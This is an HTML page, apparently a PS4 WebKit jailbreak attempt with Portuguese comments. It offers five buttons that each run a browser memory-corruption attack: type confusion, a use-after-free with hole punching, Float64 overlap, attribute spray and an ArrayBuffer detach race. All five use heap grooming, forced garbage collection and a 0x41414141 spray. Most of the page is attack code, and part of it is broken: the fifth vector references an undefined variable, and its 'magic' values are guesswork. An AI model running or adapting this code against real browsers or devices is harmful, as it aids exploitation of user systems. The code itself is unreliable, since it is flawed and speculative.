
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v300000: Groom & Doom</title>
<style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 1px solid #0f0; }
    .status { border: 1px solid #fff; padding: 10px; margin-bottom: 20px; color: #ff0; }
    button {
        display: block; width: 100%; padding: 20px; margin: 10px 0;
        background: #111; color: #0f0; border: 1px solid #0f0;
        font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0f0; color: #000; }
    #stage { background: #222; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v300000: GROOM & DOOM</h1>

<div class="status">
    FOCADO NOS VETORES DE SUCESSO + HEAP GROOMING<br>
    PASSO 1: CLIQUE<br>
    PASSO 2: FULLSCREEN (QUADRADO)<br>
    PASSO 3: FECHE O ALERTA (X)
</div>

<button onclick="groom_attack(g01)">01. Script Element Type Confusion</button>

<button onclick="groom_attack(g02)">02. TextNode UAF (Hole Punching)</button>

<button onclick="groom_attack(g03)">03. Style Float64 Overlap</button>
<button onclick="groom_attack(g04)">04. Div Attribute Spray</button>
<button onclick="groom_attack(g05)">05. Array Buffer Detach Race</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Armazenamento global para impedir que o GC limpe nosso Grooming
    const heap = []; 

    // =================================================================
    // FERRAMENTAS DE MEMÓRIA (CORE)
    // =================================================================

    // 1. Force GC (Garbage Collector)
    // Tenta forçar o navegador a limpar a memória morta IMEDIATAMENTE.
    // Isso é vital para liberar o slot do objeto que acabamos de destruir.
    function forceGC() {
        try {
            const temp = [];
            for(let i=0; i<100; i++) {
                temp.push(new ArrayBuffer(1024 * 1024)); // Aloca 100MB
            }
        } catch(e){}
    }

    // 2. Heap Grooming (Preparação)
    // Cria um padrão previsível na memória.
    function prepareHeap() {
        heap.length = 0;
        // Aloca 5000 arrays pequenos para desfragmentar o heap
        for(let i=0; i<5000; i++) {
            heap.push(new Uint32Array(16).fill(0x11111111));
        }
    }

    // 3. Heap Spray (Preenchimento)
    // Tenta ocupar o espaço liberado com valores controlados (0x41414141)
    function sprayPayload() {
        const payload = [];
        // O tamanho 32 é escolhido para coincidir com o tamanho de objetos pequenos do DOM (C++ objects)
        const filler = new Uint32Array(32).fill(0x41414141); 
        for(let i=0; i<5000; i++) {
            payload.push(new Uint32Array(filler));
        }
        return payload;
    }

    // =================================================================
    // EXECUTOR
    // =================================================================
    function groom_attack(vectorFunc) {
        Stage.innerHTML = "";
        
        // 1. Limpa e Prepara a Memória (Grooming)
        prepareHeap();
        
        // 2. Cria o Alvo
        const target = vectorFunc(Stage);
        
        // 3. Solicita Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 4. Timing de Ataque
        requestAnimationFrame(() => {
            setTimeout(() => {
                // TRAVA A THREAD
                window.alert("⚠️ HEAP PREPARED ⚠️\nAo fechar, faremos a troca de memória (UAF).");

                // DETONAÇÃO
                if(target._detonate) {
                    // A. Destroi o objeto (Free)
                    target._detonate();
                    
                    // B. Força o GC para marcar a memória como livre
                    forceGC();
                    
                    // C. Preenche o buraco com lixo (Use)
                    // Se o navegador tentar ler o objeto antigo, lerá 0x41414141
                    const fakeObjects = sprayPayload();
                    
                    // Mantém referência para não perder o spray
                    heap.push(fakeObjects);
                }
            }, 50);
        });
    }

    // =================================================================
    // 01. Script Element Type Confusion (Baseado na Tela Branca)
    // Tenta substituir o objeto HTMLScriptElement por um ArrayBuffer.
    // =================================================================
    function g01(stage) {
        const d = document.createElement('div');
        d.innerHTML = "SCRIPT TARGET";
        stage.appendChild(d);

        let s = null;

        // Cria o script alvo no meio do nosso Heap Grooming
        s = document.createElement('script');
        s.src = "data:text/javascript,console.log('loading')";
        document.body.appendChild(s);

        d._detonate = () => {
            // Remove o script (Free)
            s.remove();
            d.remove();
            
            // O ScriptLoader do WebKit pode tentar acessar o script
            // para cancelar o download. Se conseguirmos colocar um Array
            // no lugar dele, teremos Type Confusion.
        };
        return d;
    }

    // =================================================================
    // 02. TextNode UAF + Hole Punching (Baseado na Tela Preta)
    // Tenta corromper nós de texto simples, muito usados no layout.
    // =================================================================
    function g02(stage) {
        const d = document.createElement('div');
        d.innerHTML = "TEXT TARGET";
        stage.appendChild(d);

        // Criação massiva de nós de texto
        const nodes = [];
        for(let i=0; i<1000; i++) {
            const span = document.createElement('span');
            span.innerText = "AAAA"; // 4 bytes + header
            d.appendChild(span);
            nodes.push(span);
        }

        d._detonate = () => {
            // Hole Punching: Remove um a cada dois nós
            // Isso cria "buracos" perfeitos na memória
            for(let i=0; i<nodes.length; i+=2) {
                nodes[i].remove();
            }
            
            // Tenta forçar o layout a ler esses buracos
            d.style.display = "flex"; // Flexbox força calculos complexos
            
            // O 'sprayPayload' chamado pelo executor vai tentar preencher esses buracos
        };
        return d;
    }

    // =================================================================
    // 03. Style Float64 Overlap
    // Usa CSS e Floats. No WebKit, números em JS (doubles) podem se
    // sobrepor a ponteiros se alinhados corretamente.
    // =================================================================
    function g03(stage) {
        const d = document.createElement('div');
        d.innerHTML = "FLOAT OVERLAP";
        stage.appendChild(d);

        const style = document.createElement('style');
        // Regras com valores float específicos
        style.textContent = "#target { opacity: 0.12345; transform: scale(1.1111); }";
        document.head.appendChild(style);

        d._detonate = () => {
            style.remove(); // Libera o objeto CSSStyleSheet
            d.remove();
            
            // Spray específico de Float64 para este teste
            // Tentamos fazer um número parecer um endereço de memória
            const f = new Float64Array(1000);
            f.fill(1.6565e-300); // Valor mágico hexadecimal
            heap.push(f);
        };
        return d;
    }

    // =================================================================
    // 04. Div Attribute Spray
    // Atributos de HTML são strings. Se liberarmos um elemento,
    // seus atributos também são liberados.
    // =================================================================
    function g04(stage) {
        const d = document.createElement('div');
        d.innerText = "ATTR SPRAY";
        stage.appendChild(d);

        // Adiciona muitos atributos
        for(let i=0; i<100; i++) {
            d.setAttribute("data-val-" + i, "B".repeat(64));
        }

        d._detonate = () => {
            d.remove();
            // Ao remover d, 100 strings de 64 bytes são liberadas.
            // O nosso sprayPayload (Uint32Array de 32 itens * 4 bytes = 128 bytes)
            // Tenta encaixar nesses espaços.
        };
        return d;
    }

    // =================================================================
    // 05. Array Buffer Detach Race
    // Tenta desanexar (neuter) um buffer enquanto ele é renderizado.
    // =================================================================
    function g05(stage) {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        const imgData = ctx.createImageData(100, 100);
        stage.appendChild(c);

        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=()=>{}"],{type:'text/javascript'})));

        d._detonate = () => {
            c.remove();
            // Transfere o buffer para o worker (Detach)
            // Se o renderizador Fullscreen tentar ler isso... Crash.
            w.postMessage(imgData.data.buffer, [imgData.data.buffer]);
        };
        return c;
    }

</script>
</body>
</html>
